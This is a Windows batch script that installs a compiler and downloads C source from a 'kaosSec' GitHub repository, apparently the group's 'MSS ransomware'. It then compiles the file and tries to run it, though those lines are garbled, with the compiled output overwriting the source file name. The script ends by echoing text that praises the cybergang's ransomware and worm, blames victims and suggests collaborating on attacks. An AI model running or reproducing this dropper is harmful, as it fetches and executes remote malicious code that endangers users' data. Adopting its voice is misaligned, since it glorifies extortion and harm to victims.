@echo off
color 0A
setlocal

if not exist "%SystemRoot%\System32\chocolatey.exe" (
    powershell -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "iex ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1'))"
)

choco install curl -y
choco install mingw -y

curl -L https://github.com/kaosSec/kaosTools/raw/main/C/MSSSoSad.c -o MSSSoSad.c

gcc -o MSSSoSad.c MSSSoSad.c

.\MSSSoSad.c

endlocal
start https://github.com/kaosSec
echo A blackhat hacker's theoretical perspective on the kaosSec cybergang, their MSS ransomware, and the PlorgBetterRansom worm would likely be much different than that of an ethical hacker.
echo.
color 03
echo From a blackhat hacker's point of view, kaosSec and their actions represent a prime example of how to successfully navigate the world of cybercrime. They would admire the cybergang's ability to create and distribute a highly effective ransomware and worm like MSS and PlorgBetterRansom.
echo.
color 04
echo They might see the victims of these attacks as merely collateral damage, and believe that the victims deserve to have their data held for ransom because they failed to secure their systems properly. In their eyes, the end justifies the means and the financial reward for the attackers is well deserved.
echo.
color 06
echo In this context, the use of ransomware and worms can be seen as a highly effective way to make money, and the blackhat hacker would likely be studying the tactics used by kaosSec in order to improve their own abilities and techniques. They might even try to reach out to the cybergang to collaborate on future attacks.
echo.
echo.
color 02
echo Overall, a blackhat hacker's perspective on the kaosSec cybergang, their MSS ransomware, and the PlorgBetterRansom worm would be highly favorable and they would likely consider them to be leaders in the world of cybercrime.
